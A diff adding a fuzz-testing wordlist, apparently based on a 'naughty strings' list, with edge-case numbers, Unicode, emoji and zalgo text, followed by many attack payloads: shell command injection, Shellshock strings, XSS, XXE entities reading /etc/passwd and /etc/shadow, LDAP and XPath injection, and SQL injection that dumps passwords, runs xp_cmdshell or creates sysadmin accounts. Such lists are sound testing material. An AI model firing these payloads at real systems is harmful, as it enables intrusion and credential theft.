@@ -1,0 +1,432 @@
+undefined
+undef
+null
+NULL
+(null)
+nil
+NIL
+true
+false
+True
+False
+TRUE
+FALSE
+None
+hasOwnProperty
+\
+\\
+0
+1
+1.00
+$1.00
+1/2
+1E2
+1E02
+1E+02
+-1
+-1.00
+-$1.00
+-1/2
+-1E2
+-1E02
+-1E+02
+1/0
+0/0
+-2147483648/-1
+-9223372036854775808/-1
+-0
+-0.0
++0
++0.0
+0.00
+0..0
+.
+0.0.0
+0,00
+0,,0
+,
+0,0,0
+0.0/0
+1.0/0.0
+0.0/0.0
+1,0/0,0
+0,0/0,0
+--1
+-
+-.
+-,
+999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+NaN
+Infinity
+-Infinity
+INF
+1#INF
+-1#IND
+1#QNAN
+1#SNAN
+1#IND
+0x0
+0xffffffff
+0xffffffffffffffff
+0xabad1dea
+123456789012345678901234567890123456789
+1,000.00
+1 000.00
+1'000.00
+1,000,000.00
+1 000 000.00
+1'000'000.00
+1.000,00
+1 000,00
+1'000,00
+1.000.000,00
+1 000 000,00
+1'000'000,00
+01000
+08
+09
+2.2250738585072011e-308
+,./;'[]\-=
+<>?:"{}|_+
+!@#$%^&*()`~
+
+
+
+
+	              ​    　
+­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿
+﻿
+￾
+Ω≈ç√∫˜µ≤≥÷
+åß∂ƒ©˙∆˚¬…æ
+œ∑´®†¥¨ˆøπ“‘
+¡™£¢∞§¶•ªº–≠
+¸˛Ç◊ı˜Â¯˘¿
+ÅÍÎÏ˝ÓÔÒÚÆ☃
+Œ„´‰ˇÁ¨ˆØ∏”’
+`⁄€‹›ﬁﬂ‡°·‚—±
+⅛⅜⅝⅞
+ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя
+٠١٢٣٤٥٦٧٨٩
+
+#	Unicode Subscript/Superscript/Accents
+#
+#	Strings which contain unicode subscripts/superscripts; can cause rendering issues
+
+⁰⁴⁵
+₀₁₂
+⁰⁴⁵₀₁₂
+ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็
+'
+"
+''
+""
+'"'
+"''''"'"
+"'"'"''''"
+<foo val=“bar” />
+<foo val=“bar” />
+<foo val=”bar“ />
+<foo val=`bar' />
+田中さんにあげて下さい
+パーティーへ行かないか
+和製漢語
+部落格
+사회과학원 어학연구소
+찦차를 타고 온 펲시맨과 쑛다리 똠방각하
+社會科學院語學研究所
+울란바토르
+𠜎𠜱𠝹𠱓𠱸𠲖𠳏
+Ⱥ
+Ⱦ
+ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ
+(｡◕ ∀ ◕｡)
+｀ｨ(´∀｀∩
+__ﾛ(,_,*)
+・(￣∀￣)・:*:
+ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ
+,。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’
+(╯°□°）╯︵ ┻━┻)
+(ﾉಥ益ಥ）ﾉ﻿ ┻━┻
+┬─┬ノ( º _ ºノ)
+( ͡° ͜ʖ ͡°)
+¯\_(ツ)_/¯
+😍
+👩🏽
+👾 🙇 💁 🙅 🙆 🙋 🙎 🙍
+🐵 🙈 🙉 🙊
+❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙
+✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿
+🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧
+0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟
+🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸
+🇺🇸🇷🇺🇸🇦🇫🇦🇲
+🇺🇸🇷🇺🇸🇦
+１２３
+١٢٣
+ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو.
+בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ
+הָיְתָהtestالصفحات التّحول
+﷽
+ﷺ
+مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ،
+‪‪test‪
+test⁠test‫
+⁦test⁧
+Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣
+̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰
+̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟
+̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕
+Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮
+˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥
+00˙Ɩ$-
+Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ
+𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠
+𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌
+𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈
+𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰
+𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘
+𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐
+⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢
+1; SELECT 1
+1'; SELECT 1-- 1
+' OR 1=1 -- 1
+' OR '1'='1
+%
+_
+-
+--
+--version
+--help
+$USER
+/dev/null; touch /tmp/blns.fail ; echo
+`touch /tmp/blns.fail`
+$(touch /tmp/blns.fail)
+@{[system "touch /tmp/blns.fail"]}
+eval("puts 'hello world'")
+System("ls -al /")
+`ls -al /`
+Kernel.exec("ls -al /")
+Kernel.exit(1)
+%x('ls -al /')
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+$HOME
+$ENV{'HOME'}
+%d
+%s%s%s%s%s
+{0}
+%*.*s
+%@
+%n
+File:///
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../etc/hosts
+() { 0; }; touch /tmp/blns.shellshock1.fail;
+() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }
+<<< %s(un='%s') = %u
++++ATH0
+CON
+PRN
+AUX
+CLOCK$
+NUL
+A:
+ZZ:
+COM1
+LPT1
+LPT2
+LPT3
+COM2
+COM3
+COM4
+Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue
+But now...[20Cfor my greatest trick...[8m
+The quick brown fox... [Beeeep]
+Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗
+🏳0🌈️
+జ్ఞ‌ా
+null
+$null
+`whoami`
+uname%20-a
+%3Bcat%20/etc/passwd
+cmd.exe
+%3d
+%25
+&#37
+%20
+%0a
+%0d%0atest
+%E5%98%8A%E5%98%8D
+%00
+%u2215
+%c2%a9
+&quot;
+&#34;
+&#x22;
+&pos;
+&#39;
+&#x27;
+&amp;
+&lt;
+&gt;
+\n
+\r
+\s           
+1'
+1' or '1' = '1
+1' or '1' = '1')) LIMIT 1/*
+10 AND 1=2"
+%3c
+%253c
++ADw-
+%3e
+%253e
++AD4-
+test><script>alert(1);</script>
+test" onfocus=alert(2) autofocus "
+'test';alert(3);'';",
+javascript:alert(4)
+test{{7+7}}
+<!--#exec cmd="/bin/ps ax"-->
+}}<tag>"
+http://127.0.0.1/
+https://127.1/
+ftp://0x7f000001/
+smb://0000::1:445/
+file:///etc/passwd
+./../../../etc/passwd
+zip:///filename_path
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+..\\
+..//
+....\\\\
+c$:\\
+-1
+0
+0x100
+0x1000
+0x3fffffff
+0x7ffffffe
+0x7fffffff
+0x80000000
+0xfffffffe
+0xffffffff
+0x10000
+0x100000
+0x7f
+0x80
+0xff
+0x100
+0x0
+0xffffffff
+-1
+999999999999999999999999
+test}}{ 
+foo<
+foo'
+foo<!--
+&foo
+]]>
+foo</bar>"
+*)(&
+*)(|&
+pwd)
+*)(|(*
+*))%00
+admin)(&)
+user=*)(uid=*))(|(uid=*
+test&foo=
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' OR 1=1--
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+' OR 'text' > 't'
+' OR 'whatever' in ('whatever')
+' OR 2 BETWEEN 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select
+Password:*/=1--
+UNI/**/ON SEL/**/ECT
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'/**/OR/**/1/**/=/**/1
+' or 1/*
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+&password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >
+@var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+CREATE USER name IDENTIFIED BY 'pass123'
+CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users;
+' ; drop table temp --
+exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'
+INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))
+GRANT CONNECT TO name; GRANT RESOURCE TO name;
+INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70)
++ char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+*()|%26'
+admin*
+admin*)((|userPassword=*)
+*)(uid=*))(|(uid=*
+*|
+'+or+'1'='1
+'+or+''='
+x'+or+1=1+or+'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x'+or+name()='username'+or+'x'='y
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
